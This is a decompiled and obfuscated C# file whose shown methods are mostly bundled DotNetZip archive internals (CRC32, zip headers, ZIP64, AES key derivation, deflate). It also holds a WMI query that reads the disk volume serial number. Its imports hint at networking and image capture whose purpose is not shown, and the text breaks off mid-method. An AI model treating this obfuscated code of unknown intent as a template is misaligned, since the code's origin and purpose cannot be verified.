using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Ionic;
using Ionic.Zip;
using SmartAssembly.MemoryManagement;
using karo;
using ns0;
using ns1;
using ns10;
using ns11;
using ns12;
using ns13;
using ns14;
using ns15;
using ns2;
using ns3;
using ns4;
using ns6;
using ns7;
using ns8;
using ns9;

namespace ns5;

internal sealed class Class6
{
	static int smethod_0(Class57 class57_0)
	{
		return class57_0.int_0;
	}

	static uint smethod_1(uint uint_0)
	{
		uint num = uint_0;
		num = ((num & 0x55555555) << 1) | ((num >> 1) & 0x55555555u);
		num = ((num & 0x33333333) << 2) | ((num >> 2) & 0x33333333u);
		num = ((num & 0xF0F0F0F) << 4) | ((num >> 4) & 0xF0F0F0Fu);
		return (num << 24) | ((num & 0xFF00) << 8) | ((num >> 8) & 0xFF00u) | (num >> 24);
	}

	static void smethod_2(int int_0, GClass3 gclass3_0, byte byte_0)
	{
		while (int_0-- > 0)
		{
			if (gclass3_0.bool_0)
			{
				uint num = (gclass3_0.uint_2 >> 24) ^ byte_0;
				gclass3_0.uint_2 = (gclass3_0.uint_2 << 8) ^ gclass3_0.uint_1[num];
			}
			else
			{
				uint num2 = (gclass3_0.uint_2 & 0xFFu) ^ byte_0;
				gclass3_0.uint_2 = (gclass3_0.uint_2 >> 8) ^ gclass3_0.uint_1[num2];
			}
		}
	}

	static EventArgs1 smethod_3(string string_0)
	{
		return new EventArgs1(string_0, Enum6.const_6);
	}

	static void smethod_4(EventArgs0 eventArgs0_0, int int_0)
	{
		eventArgs0_0.int_0 = int_0;
	}

	static void smethod_5(string string_0, string string_1, GClass1 gclass1_0)
	{
		if (File.Exists(string_1))
		{
			Class6.smethod_129(gclass1_0, string_1, string_0);
			return;
		}
		if (!Directory.Exists(string_1))
		{
			throw new FileNotFoundException($"That file or directory ({string_1}) does not exist!");
		}
		Class6.smethod_319(string_1, gclass1_0, string_0);
	}

	static DateTime smethod_6(int int_0)
	{
		if (int_0 != 65535 && int_0 != 0)
		{
			short num = (short)(int_0 & 0xFFFF);
			short num2 = (short)((int_0 & 0xFFFF0000L) >> 16);
			int i = 1980 + ((num2 & 0xFE00) >> 9);
			int j = (num2 & 0x1E0) >> 5;
			int k = num2 & 0x1F;
			int num3 = (num & 0xF800) >> 11;
			int l = (num & 0x7E0) >> 5;
			int m = (num & 0x1F) * 2;
			if (m >= 60)
			{
				l++;
				m = 0;
			}
			if (l >= 60)
			{
				num3++;
				l = 0;
			}
			if (num3 >= 24)
			{
				k++;
				num3 = 0;
			}
			DateTime value = DateTime.Now;
			bool flag = false;
			try
			{
				value = new DateTime(i, j, k, num3, l, m, 0);
				flag = true;
			}
			catch (ArgumentOutOfRangeException)
			{
				if (i == 1980 && (j == 0 || k == 0))
				{
					try
					{
						value = new DateTime(1980, 1, 1, num3, l, m, 0);
						flag = true;
					}
					catch (ArgumentOutOfRangeException)
					{
						try
						{
							value = new DateTime(1980, 1, 1, 0, 0, 0, 0);
							flag = true;
							goto end_IL_00e9;
						}
						catch (ArgumentOutOfRangeException)
						{
							goto end_IL_00e9;
						}
						end_IL_00e9:;
					}
				}
				else
				{
					try
					{
						for (; i < 1980; i++)
						{
						}
						while (i > 2030)
						{
							i--;
						}
						for (; j < 1; j++)
						{
						}
						while (j > 12)
						{
							j--;
						}
						for (; k < 1; k++)
						{
						}
						while (k > 28)
						{
							k--;
						}
						for (; l < 0; l++)
						{
						}
						while (l > 59)
						{
							l--;
						}
						for (; m < 0; m++)
						{
						}
						while (m > 59)
						{
							m--;
						}
						value = new DateTime(i, j, k, num3, l, m, 0);
						flag = true;
					}
					catch (ArgumentOutOfRangeException)
					{
					}
				}
			}
			if (!flag)
			{
				string arg = $"y({i}) m({j}) d({k}) h({num3}) m({l}) s({m})";
				throw new ZipException($"Bad date/time format in the zip file. ({arg})");
			}
			return DateTime.SpecifyKind(value, DateTimeKind.Local);
		}
		return new DateTime(1995, 1, 1, 0, 0, 0, 0);
	}

	static void smethod_7(Stream stream_0, GClass0 gclass0_0)
	{
		Stream4 stream = stream_0 as Stream4;
		if (gclass0_0.long_2 == 0L && gclass0_0.long_0 == 0L)
		{
			if (gclass0_0.enum0_0 == Enum0.const_6)
			{
				return;
			}
			if (gclass0_0.string_3 != null)
			{
				int num = 0;
				if (gclass0_0.enum2_0 == Enum2.const_1)
				{
					num = 12;
				}
				else if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
				{
					num = gclass0_0.class19_1.byte_0.Length + Class6.smethod_257(gclass0_0.class19_1).Length;
				}
				if (gclass0_0.enum0_0 == Enum0.const_6 && !stream_0.CanSeek)
				{
					throw new ZipException("Zero bytes written, encryption in use, and non-seekable output.");
				}
				if (gclass0_0.enum2_0 != 0)
				{
					stream_0.Seek(-1 * num, SeekOrigin.Current);
					stream_0.SetLength(stream_0.Position);
					if (stream != null)
					{
						Class6.smethod_117((long)num, stream);
					}
					gclass0_0.int_3 -= num;
					gclass0_0.long_3 -= num;
				}
				gclass0_0.string_3 = null;
				gclass0_0.short_7 &= -2;
				gclass0_0.byte_2[6] = (byte)((uint)gclass0_0.short_7 & 0xFFu);
				gclass0_0.byte_2[7] = (byte)((gclass0_0.short_7 & 0xFF00) >> 8);
				if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
				{
					short num2 = (short)(gclass0_0.byte_2[26] + gclass0_0.byte_2[27] * 256);
					int int_ = 30 + num2;
					int num3 = Class6.smethod_212((ushort)39169, int_, gclass0_0.byte_2);
					if (num3 >= 0)
					{
						gclass0_0.byte_2[num3++] = 153;
						gclass0_0.byte_2[num3++] = 153;
					}
				}
			}
			gclass0_0.CompressionMethod = CompressionMethod.None;
			gclass0_0.Encryption = Enum2.const_0;
		}
		else if (gclass0_0.class21_1 != null || gclass0_0.class19_1 != null)
		{
			if (gclass0_0.enum2_0 == Enum2.const_1)
			{
				gclass0_0.long_0 += 12L;
			}
			else if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
			{
				gclass0_0.long_0 += Class6.smethod_538(gclass0_0.class19_1);
			}
		}
		int num4 = 8;
		byte[] byte_ = gclass0_0.byte_2;
		num4 = 9;
		byte_[8] = (byte)((uint)gclass0_0.short_8 & 0xFFu);
		byte[] byte_2 = gclass0_0.byte_2;
		num4 = 10;
		byte_2[9] = (byte)((gclass0_0.short_8 & 0xFF00) >> 8);
		num4 = 14;
		byte[] byte_3 = gclass0_0.byte_2;
		num4 = 15;
		byte_3[14] = (byte)((uint)gclass0_0.int_2 & 0xFFu);
		byte[] byte_4 = gclass0_0.byte_2;
		num4 = 16;
		byte_4[15] = (byte)((gclass0_0.int_2 & 0xFF00) >> 8);
		byte[] byte_5 = gclass0_0.byte_2;
		num4 = 17;
		byte_5[16] = (byte)((gclass0_0.int_2 & 0xFF0000) >> 16);
		byte[] byte_6 = gclass0_0.byte_2;
		num4 = 18;
		byte_6[17] = (byte)((gclass0_0.int_2 & 0xFF000000L) >> 24);
		Class6.smethod_25(gclass0_0);
		short num5 = (short)(gclass0_0.byte_2[26] + gclass0_0.byte_2[27] * 256);
		short num6 = (short)(gclass0_0.byte_2[28] + gclass0_0.byte_2[29] * 256);
		if (gclass0_0.nullable_2.Value)
		{
			gclass0_0.byte_2[4] = 45;
			gclass0_0.byte_2[5] = 0;
			for (int i = 0; i < 8; i++)
			{
				gclass0_0.byte_2[num4++] = byte.MaxValue;
			}
			num4 = 30 + num5;
			gclass0_0.byte_2[num4++] = 1;
			gclass0_0.byte_2[num4++] = 0;
			num4 += 2;
			Array.Copy(BitConverter.GetBytes(gclass0_0.long_2), 0, gclass0_0.byte_2, num4, 8);
			num4 += 8;
			Array.Copy(BitConverter.GetBytes(gclass0_0.long_0), 0, gclass0_0.byte_2, num4, 8);
		}
		else
		{
			gclass0_0.byte_2[4] = 20;
			gclass0_0.byte_2[5] = 0;
			num4 = 18;
			byte[] byte_7 = gclass0_0.byte_2;
			num4 = 19;
			byte_7[18] = (byte)((ulong)gclass0_0.long_0 & 0xFFuL);
			byte[] byte_8 = gclass0_0.byte_2;
			num4 = 20;
			byte_8[19] = (byte)((gclass0_0.long_0 & 0xFF00L) >> 8);
			byte[] byte_9 = gclass0_0.byte_2;
			num4 = 21;
			byte_9[20] = (byte)((gclass0_0.long_0 & 0xFF0000L) >> 16);
			byte[] byte_10 = gclass0_0.byte_2;
			num4 = 22;
			byte_10[21] = (byte)((gclass0_0.long_0 & 0xFF000000L) >> 24);
			byte[] byte_11 = gclass0_0.byte_2;
			num4 = 23;
			byte_11[22] = (byte)((ulong)gclass0_0.long_2 & 0xFFuL);
			byte[] byte_12 = gclass0_0.byte_2;
			num4 = 24;
			byte_12[23] = (byte)((gclass0_0.long_2 & 0xFF00L) >> 8);
			byte[] byte_13 = gclass0_0.byte_2;
			num4 = 25;
			byte_13[24] = (byte)((gclass0_0.long_2 & 0xFF0000L) >> 16);
			byte[] byte_14 = gclass0_0.byte_2;
			num4 = 26;
			byte_14[25] = (byte)((gclass0_0.long_2 & 0xFF000000L) >> 24);
			if (num6 != 0)
			{
				num4 = 30 + num5;
				short num7 = (short)(gclass0_0.byte_2[num4 + 2] + gclass0_0.byte_2[num4 + 3] * 256);
				if (num7 == 16)
				{
					gclass0_0.byte_2[num4++] = 153;
					gclass0_0.byte_2[num4++] = 153;
				}
			}
		}
		if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
		{
			num4 = 8;
			byte[] byte_15 = gclass0_0.byte_2;
			num4 = 9;
			byte_15[8] = 99;
			byte[] byte_16 = gclass0_0.byte_2;
			num4 = 10;
			byte_16[9] = 0;
			num4 = 30 + num5;
			do
			{
				ushort num8 = (ushort)(gclass0_0.byte_2[num4] + gclass0_0.byte_2[num4 + 1] * 256);
				short num9 = (short)(gclass0_0.byte_2[num4 + 2] + gclass0_0.byte_2[num4 + 3] * 256);
				if (num8 == 39169)
				{
					num4 += 9;
					gclass0_0.byte_2[num4++] = (byte)((uint)gclass0_0.short_8 & 0xFFu);
					gclass0_0.byte_2[num4++] = (byte)((uint)gclass0_0.short_8 & 0xFF00u);
				}
				else
				{
					num4 += num9 + 4;
				}
			}
			while (num4 < num6 - 30 - num5);
		}
		if ((gclass0_0.short_7 & 8) != 8 || (gclass0_0.enum0_0 == Enum0.const_6 && stream_0.CanSeek))
		{
			if (stream_0 is ZipSegmentedStream zipSegmentedStream && gclass0_0.uint_0 != zipSegmentedStream.uint_0)
			{
				string string_ = gclass0_0.class8_0.gclass1_0.string_0;
				uint uint_ = gclass0_0.uint_0;
				using Stream stream2 = Class6.smethod_621(uint_, string_);
				stream2.Seek(gclass0_0.long_4, SeekOrigin.Begin);
				stream2.Write(gclass0_0.byte_2, 0, gclass0_0.byte_2.Length);
			}
			else
			{
				stream_0.Seek(gclass0_0.long_4, SeekOrigin.Begin);
				stream_0.Write(gclass0_0.byte_2, 0, gclass0_0.byte_2.Length);
				if (stream != null)
				{
					Class6.smethod_117((long)gclass0_0.byte_2.Length, stream);
				}
				stream_0.Seek(gclass0_0.long_0, SeekOrigin.Current);
			}
		}
		if ((gclass0_0.short_7 & 8) == 8 && !gclass0_0.bool_4)
		{
			byte[] array = new byte[16 + (gclass0_0.nullable_2.Value ? 8 : 0)];
			num4 = 0;
			Array.Copy(BitConverter.GetBytes(134695760), 0, array, 0, 4);
			num4 = 4;
			Array.Copy(BitConverter.GetBytes(gclass0_0.int_2), 0, array, 4, 4);
			num4 = 8;
			if (gclass0_0.nullable_2.Value)
			{
				Array.Copy(BitConverter.GetBytes(gclass0_0.long_0), 0, array, num4, 8);
				num4 += 8;
				Array.Copy(BitConverter.GetBytes(gclass0_0.long_2), 0, array, num4, 8);
				num4 += 8;
			}
			else
			{
				array[num4++] = (byte)((ulong)gclass0_0.long_0 & 0xFFuL);
				array[num4++] = (byte)((gclass0_0.long_0 & 0xFF00L) >> 8);
				array[num4++] = (byte)((gclass0_0.long_0 & 0xFF0000L) >> 16);
				array[num4++] = (byte)((gclass0_0.long_0 & 0xFF000000L) >> 24);
				array[num4++] = (byte)((ulong)gclass0_0.long_2 & 0xFFuL);
				array[num4++] = (byte)((gclass0_0.long_2 & 0xFF00L) >> 8);
				array[num4++] = (byte)((gclass0_0.long_2 & 0xFF0000L) >> 16);
				array[num4++] = (byte)((gclass0_0.long_2 & 0xFF000000L) >> 24);
			}
			stream_0.Write(array, 0, array.Length);
			gclass0_0.int_4 += array.Length;
		}
	}

	static EventArgs2 smethod_8(int int_0, string string_0, GClass0 gclass0_0)
	{
		EventArgs2 eventArgs = new EventArgs2(string_0, Enum6.const_1);
		eventArgs.int_0 = int_0;
		eventArgs.gclass0_0 = gclass0_0;
		return eventArgs;
	}

	static void smethod_9(string string_0)
	{
		using GClass1 gClass = new GClass1();
		gClass.FullScan = true;
		Class6.smethod_338(gClass, string_0);
		Class6.smethod_55(gClass, string_0);
	}

	static bool smethod_10(Class16 class16_0, string string_0)
	{
		return class16_0.class9_0.vmethod_0(string_0);
	}

	static EventArgs3 smethod_11(long long_0, GClass0 gclass0_0, long long_1, string string_0)
	{
		EventArgs3 eventArgs = new EventArgs3(string_0, Enum6.const_16);
		eventArgs.string_0 = string_0;
		eventArgs.gclass0_0 = gclass0_0;
		eventArgs.long_0 = long_0;
		eventArgs.long_1 = long_1;
		return eventArgs;
	}

	static void smethod_12(Stream stream_0)
	{
		uint num = (uint)Class6.smethod_568(stream_0);
		if (num != 808471376)
		{
			stream_0.Seek(-4L, SeekOrigin.Current);
		}
	}

	static string smethod_13(Stream0 stream0_0)
	{
		return stream0_0.string_1;
	}

	static void smethod_14(int int_0, int int_1, GClass3 gclass3_0)
	{
		uint[] array = new uint[32];
		uint[] array2 = new uint[32];
		if (int_1 == 0)
		{
			return;
		}
		uint num = ~gclass3_0.uint_2;
		array2[0] = gclass3_0.uint_0;
		uint num2 = 1u;
		for (int i = 1; i < 32; i++)
		{
			array2[i] = num2;
			num2 <<= 1;
		}
		Class6.smethod_252(gclass3_0, array, array2);
		Class6.smethod_252(gclass3_0, array2, array);
		uint num3 = (uint)int_1;
		do
		{
			Class6.smethod_252(gclass3_0, array, array2);
			if ((num3 & 1) == 1)
			{
				num = Class6.smethod_420(num, gclass3_0, array);
			}
			num3 >>= 1;
			if (num3 == 0)
			{
				break;
			}
			Class6.smethod_252(gclass3_0, array2, array);
			if ((num3 & 1) == 1)
			{
				num = Class6.smethod_420(num, gclass3_0, array2);
			}
			num3 >>= 1;
		}
		while (num3 != 0);
		num ^= (uint)int_0;
		gclass3_0.uint_2 = ~num;
	}

	static void smethod_15(GClass0 gclass0_0, Stream stream_0)
	{
		byte[] array = new byte[gclass0_0.BufferSize];
		Stream4 stream = new Stream4(gclass0_0.ArchiveStream);
		long long_ = gclass0_0.long_4;
		int lengthOfHeader = gclass0_0.LengthOfHeader;
		Class6.smethod_290(gclass0_0, stream_0, 0);
		Class6.smethod_425(gclass0_0);
		if (!gclass0_0.string_1.EndsWith("/"))
		{
			long num = long_ + lengthOfHeader;
			int num2 = Class6.smethod_75(gclass0_0.enum2_1);
			num -= num2;
			gclass0_0.int_3 += num2;
			stream.Seek(num, SeekOrigin.Begin);
			long num3 = gclass0_0.long_0;
			while (num3 > 0L)
			{
				num2 = (int)((num3 > array.Length) ? array.Length : num3);
				int num4 = stream.Read(array, 0, num2);
				stream_0.Write(array, 0, num4);
				num3 -= num4;
				long long_2 = stream.long_1;
				long long_3 = gclass0_0.long_0;
				Class6.smethod_78(long_2, gclass0_0, long_3);
				if (gclass0_0.bool_12)
				{
					break;
				}
			}
			if ((gclass0_0.short_7 & 8) == 8)
			{
				int num5 = 16;
				if (gclass0_0.bool_10)
				{
					num5 += 8;
				}
				byte[] buffer = new byte[num5];
				stream.Read(buffer, 0, num5);
				if (gclass0_0.bool_10 && Class6.smethod_573(gclass0_0.class8_0) == Enum8.const_0)
				{
					stream_0.Write(buffer, 0, 8);
					if (gclass0_0.long_0 > 4294967295L)
					{
						throw new InvalidOperationException("ZIP64 is required");
					}
					stream_0.Write(buffer, 8, 4);
					if (gclass0_0.long_2 > 4294967295L)
					{
						throw new InvalidOperationException("ZIP64 is required");
					}
					stream_0.Write(buffer, 16, 4);
					gclass0_0.int_4 -= 8;
				}
				else if (!gclass0_0.bool_10 && Class6.smethod_573(gclass0_0.class8_0) == Enum8.const_3)
				{
					byte[] buffer2 = new byte[4];
					stream_0.Write(buffer, 0, 8);
					stream_0.Write(buffer, 8, 4);
					stream_0.Write(buffer2, 0, 4);
					stream_0.Write(buffer, 12, 4);
					stream_0.Write(buffer2, 0, 4);
					gclass0_0.int_4 += 8;
				}
				else
				{
					stream_0.Write(buffer, 0, num5);
				}
			}
		}
		gclass0_0.long_6 = gclass0_0.int_3 + gclass0_0.long_1 + gclass0_0.int_4;
	}

	static bool smethod_16(Class12 class12_0, string string_0)
	{
		string input = ((class12_0.string_1.IndexOf('\\') == -1) ? Path.GetFileName(string_0) : string_0);
		bool flag = class12_0.regex_0.IsMatch(input);
		if (class12_0.comparisonOperator_0 != ComparisonOperator.EqualTo)
		{
			flag = !flag;
		}
		return flag;
	}

	static bool smethod_17(int int_0)
	{
		return int_0 != 33639248;
	}

	static void smethod_18(string string_0, Class19 class19_0)
	{
		class19_0.string_0 = string_0;
		if (class19_0.string_0 != null)
		{
			class19_0.short_1 = (short)(Class6.smethod_257(class19_0)[0] + Class6.smethod_257(class19_0)[1] * 256);
			if (class19_0.short_1 != class19_0.short_0)
			{
				throw new BadPasswordException();
			}
		}
	}

	static void smethod_19(EventArgs0 eventArgs0_0, long long_0)
	{
		eventArgs0_0.long_0 = long_0;
	}

	static void smethod_20(GClass0 gclass0_0, string string_0)
	{
		if (gclass0_0.class8_0.gclass1_0 != null && !gclass0_0.class8_0.gclass1_0.bool_12)
		{
			Class6.smethod_594(gclass0_0, string_0, gclass0_0.class8_0.gclass1_0, bool_0: false);
		}
	}

	static void smethod_21(Stream10 stream10_0, string string_0)
	{
		if (stream10_0.bool_0)
		{
			throw new ObjectDisposedException("GZipStream");
		}
		stream10_0.string_1 = string_0;
	}

	static EventArgs3 smethod_22(string string_0)
	{
		return new EventArgs3(string_0, Enum6.const_11);
	}

	static void smethod_23(GClass3 gclass3_0, byte[] byte_0, int int_0, int int_1)
	{
		if (byte_0 == null)
		{
			throw new Exception("The data buffer must not be null.");
		}
		for (int i = 0; i < int_1; i++)
		{
			int num = int_0 + i;
			byte b = byte_0[num];
			if (gclass3_0.bool_0)
			{
				uint num2 = (gclass3_0.uint_2 >> 24) ^ b;
				gclass3_0.uint_2 = (gclass3_0.uint_2 << 8) ^ gclass3_0.uint_1[num2];
			}
			else
			{
				uint num3 = (gclass3_0.uint_2 & 0xFFu) ^ b;
				gclass3_0.uint_2 = (gclass3_0.uint_2 >> 8) ^ gclass3_0.uint_1[num3];
			}
		}
		gclass3_0.long_0 += int_1;
	}

	static void smethod_24(int int_0, int[] int_1, int int_2, int int_3)
	{
		int_0 += int_2;
		while (int_2 < int_0)
		{
			int num = int_1[int_2];
			int_1[int_2++] = int_1[int_3];
			int_1[int_3++] = num;
		}
	}

	static void smethod_25(GClass0 gclass0_0)
	{
		gclass0_0.nullable_1 = gclass0_0.long_0 >= 4294967295L || gclass0_0.long_2 >= 4294967295L || gclass0_0.long_4 >= 4294967295L;
		if (Class6.smethod_598(gclass0_0.class8_0) == Enum8.const_0 && gclass0_0.nullable_1.Value)
		{
			throw new ZipException("Compressed or Uncompressed size, or offset exceeds the maximum value. Consider setting the UseZip64WhenSaving property on the ZipFile instance.");
		}
		gclass0_0.nullable_2 = Class6.smethod_598(gclass0_0.class8_0) == Enum8.const_3 || gclass0_0.nullable_1.Value;
	}

	static void smethod_26(string string_0, GClass1 gclass1_0)
	{
		if (string.IsNullOrEmpty(string_0))
		{
			throw new ArgumentNullException("entryName");
		}
		string string_ = null;
		if (string_0.IndexOf('\\') != -1)
		{
			string_ = Path.GetDirectoryName(string_0);
			string_0 = Path.GetFileName(string_0);
		}
		string text = Class6.smethod_599(string_0, string_);
		if (gclass1_0[text] != null)
		{
			Class6.smethod_500(text, gclass1_0);
		}
	}

	static void smethod_27(string string_0, bool bool_0, GClass1 gclass1_0)
	{
		Class6.smethod_126((string)null, bool_0, ".", gclass1_0, string_0);
	}

	static int smethod_28(int int_0, GClass2 gclass2_0)
	{
		gclass2_0.int_4 = int_0;
		return Class6.smethod_417(bool_0: true, gclass2_0, int_0);
	}

	static int smethod_29(Class43 class43_0, byte[] byte_0)
	{
		int int_ = 0;
		int num = byte_0.Length;
		if (class43_0.enum17_0 != Class43.Enum17.const_6)
		{
			throw new GException0("Stream error.");
		}
		if (Class6.smethod_439(1u, byte_0, 0, byte_0.Length) != class43_0.gclass2_0.uint_0)
		{
			return -3;
		}
		class43_0.gclass2_0.uint_0 = Class6.smethod_439(0u, (byte[])null, 0, 0);
		if (num >= 1 << class43_0.int_2)
		{
			num = (1 << class43_0.int_2) - 1;
			int_ = byte_0.Length - num;
		}
		Class6.smethod_584(class43_0.class40_0, byte_0, int_, num);
		class43_0.enum17_0 = Class43.Enum17.const_7;
		return 0;
	}

	static long smethod_30(Stream stream_0, int int_0)
	{
		long position = stream_0.Position;
		byte[] array = new byte[4]
		{
			(byte)(int_0 >> 24),
			(byte)((int_0 & 0xFF0000) >> 16),
			(byte)((int_0 & 0xFF00) >> 8),
			(byte)((uint)int_0 & 0xFFu)
		};
		byte[] array2 = new byte[65536];
		int num = 0;
		bool flag = false;
		do
		{
			num = stream_0.Read(array2, 0, array2.Length);
			if (num == 0)
			{
				break;
			}
			for (int i = 0; i < num; i++)
			{
				if (array2[i] == array[3])
				{
					long position2 = stream_0.Position;
					stream_0.Seek(i - num, SeekOrigin.Current);
					int num2 = Class6.smethod_246(stream_0);
					if (flag = num2 == int_0)
					{
						break;
					}
					stream_0.Seek(position2, SeekOrigin.Begin);
				}
			}
		}
		while (!flag);
		if (!flag)
		{
			stream_0.Seek(position, SeekOrigin.Begin);
			return -1L;
		}
		return stream_0.Position - position - 4L;
	}

	static string smethod_31(Class56 class56_0)
	{
		return class56_0.string_1;
	}

	static uint smethod_32(Stream6 stream6_0)
	{
		return (uint)((((((Class6.smethod_532(stream6_0, 8) << 8) | Class6.smethod_532(stream6_0, 8)) << 8) | Class6.smethod_532(stream6_0, 8)) << 8) | Class6.smethod_532(stream6_0, 8));
	}

	static GClass1 smethod_33(Class8 class8_0)
	{
		return class8_0.gclass1_0;
	}

	static void smethod_34(Class44 class44_0, int int_0)
	{
		if (class44_0.int_6 == null)
		{
			class44_0.int_6 = new int[1];
			class44_0.int_7 = new int[int_0];
			class44_0.int_8 = new int[16];
			class44_0.int_9 = new int[3];
			class44_0.int_10 = new int[15];
			class44_0.int_11 = new int[16];
			return;
		}
		if (class44_0.int_7.Length < int_0)
		{
			class44_0.int_7 = new int[int_0];
		}
		Array.Clear(class44_0.int_7, 0, int_0);
		Array.Clear(class44_0.int_8, 0, 16);
		class44_0.int_9[0] = 0;
		class44_0.int_9[1] = 0;
		class44_0.int_9[2] = 0;
		Array.Clear(class44_0.int_10, 0, 15);
		Array.Clear(class44_0.int_11, 0, 16);
	}

	static void smethod_35(Class19 class19_0)
	{
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(class19_0.string_0, class19_0.byte_0, class19_0.int_1);
		class19_0.byte_5 = rfc2898DeriveBytes.GetBytes(class19_0.int_0 / 8);
		class19_0.byte_3 = rfc2898DeriveBytes.GetBytes(class19_0.int_0 / 8);
		class19_0.byte_2 = rfc2898DeriveBytes.GetBytes(2);
		class19_0.bool_0 = true;
	}

	static EventArgs2 smethod_36(string string_0)
	{
		return new EventArgs2(string_0, Enum6.const_0);
	}

	static void smethod_37(Class63 class63_0)
	{
		if (Class6.smethod_161(class63_0) != null)
		{
			Class6.smethod_161(class63_0).Close();
			Class6.smethod_71(class63_0);
		}
	}

	static IEnumerable<string> smethod_38(string string_0)
	{
		return new Form1.Class0(-2)
		{
			string_2 = string_0
		};
	}

	static string smethod_39(string string_0)
	{
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		if (string_0 == "")
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					string_0 = driveInfo.RootDirectory.ToString();
					break;
				}
			}
		}
		if (string_0.EndsWith(":\\"))
		{
			string_0 = string_0.Substring(0, string_0.Length - 2);
		}
		ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"" + string_0 + ":\"");
		val.Get();
		string result = ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
		val.Dispose();
		return result;
	}

	static void smethod_40(short[] short_0, short[] short_1, Class38 class38_0)
	{
		int num = 0;
		if (class38_0.int_45 != 0)
		{
			do
			{
				int num2 = class38_0.int_46 + num * 2;
				int num3 = ((class38_0.byte_0[num2] << 8) & 0xFF00) | (class38_0.byte_0[num2 + 1] & 0xFF);
				int num4 = class38_0.byte_0[class38_0.int_43 + num] & 0xFF;
				num++;
				if (num3 != 0)
				{
					int num5 = Class46.sbyte_2[num4];
					Class6.smethod_675(class38_0, num5 + Class48.int_3 + 1, short_1);
					int num6 = Class46.int_1[num5];
					if (num6 != 0)
					{
						num4 -= Class46.int_4[num5];
						Class6.smethod_465(class38_0, num4, num6);
					}
					num3--;
					num5 = Class6.smethod_147(num3);
					Class6.smethod_675(class38_0, num5, short_0);
					num6 = Class46.int_2[num5];
					if (num6 != 0)
					{
						num3 -= Class46.int_5[num5];
						Class6.smethod_465(class38_0, num3, num6);
					}
				}
				else
				{
					Class6.smethod_675(class38_0, num4, short_1);
				}
			}
			while (num < class38_0.int_45);
		}
		Class6.smethod_675(class38_0, Class38.int_18, short_1);
		class38_0.int_50 = short_1[Class38.int_18 * 2 + 1];
	}

	static long smethod_41(Stream4 stream4_0)
	{
		return stream4_0.long_1;
	}

	static string smethod_42(Class61 class61_0)
	{
		return class61_0.string_3;
	}

	static void smethod_43(ZipSegmentedStream zipSegmentedStream_0, uint uint_0)
	{
		if (zipSegmentedStream_0.stream_0 != null)
		{
			zipSegmentedStream_0.stream_0.Dispose();
			if (File.Exists(Class6.smethod_649(zipSegmentedStream_0)))
			{
				File.Delete(Class6.smethod_649(zipSegmentedStream_0));
			}
			File.Move(zipSegmentedStream_0.string_3, Class6.smethod_649(zipSegmentedStream_0));
		}
		if (uint_0 != 0)
		{
			Class6.smethod_395(zipSegmentedStream_0, zipSegmentedStream_0.uint_0 + uint_0);
		}
		Class6.smethod_296(zipSegmentedStream_0.string_1, out zipSegmentedStream_0.stream_0, out zipSegmentedStream_0.string_3);
		if (zipSegmentedStream_0.uint_0 == 0)
		{
			zipSegmentedStream_0.stream_0.Write(BitConverter.GetBytes(134695760), 0, 4);
		}
	}

	static string smethod_44(Enum enum_0)
	{
		FieldInfo field = enum_0.GetType().GetField(enum_0.ToString());
		DescriptionAttribute[] array = (DescriptionAttribute[])field.GetCustomAttributes(typeof(DescriptionAttribute), inherit: false);
		if (array.Length > 0)
		{
			return array[0].Description;
		}
		return enum_0.ToString();
	}

	static bool smethod_45(string string_0, bool bool_0)
	{
		bool result = false;
		try
		{
			if (!File.Exists(string_0))
			{
				return false;
			}
			using FileStream stream_ = File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			result = Class6.smethod_61((Stream)stream_, bool_0);
			return result;
		}
		catch (IOException)
		{
			return result;
		}
		catch (ZipException)
		{
			return result;
		}
	}

	static int smethod_46(string string_0, string string_1, GClass0 gclass0_0)
	{
		int num = 0;
		while (true)
		{
			switch (gclass0_0.ExtractExistingFile)
			{
			case Enum3.const_3:
				if (num <= 0)
				{
					Class6.smethod_589(gclass0_0, string_0);
					if (gclass0_0.bool_12)
					{
						return 2;
					}
					break;
				}
				throw new ZipException($"The file {string_1} already exists.");
			default:
				throw new ZipException($"The file {string_1} already exists.");
			case Enum3.const_1:
				Class6.smethod_288(gclass0_0, "the file {0} exists; will overwrite it...", new object[1] { string_1 });
				return 0;
			case Enum3.const_2:
				Class6.smethod_288(gclass0_0, "the file {0} exists; not extracting entry...", new object[1] { gclass0_0.string_1 });
				Class6.smethod_20(gclass0_0, string_0);
				return 1;
			}
			num++;
		}
	}

	static void smethod_47(Class38 class38_0, short[] short_0, int int_0)
	{
		int num = class38_0.int_40[int_0];
		for (int num2 = int_0 << 1; num2 <= class38_0.int_41; num2 <<= 1)
		{
			if (num2 < class38_0.int_41 && Class6.smethod_434(short_0, class38_0.int_40[num2 + 1], class38_0.int_40[num2], class38_0.sbyte_1))
			{
				num2++;
			}
			if (Class6.smethod_434(short_0, num, class38_0.int_40[num2], class38_0.sbyte_1))
			{
				break;
			}
			class38_0.int_40[int_0] = class38_0.int_40[num2];
			int_0 = num2;
		}
		class38_0.int_40[int_0] = num;
	}

	static ZipSegmentedStream smethod_48(string string_0, int int_0)
	{
		ZipSegmentedStream zipSegmentedStream = new ZipSegmentedStream();
		zipSegmentedStream.rwMode_0 = ZipSegmentedStream.RwMode.Write;
		Class6.smethod_395(zipSegmentedStream, 0u);
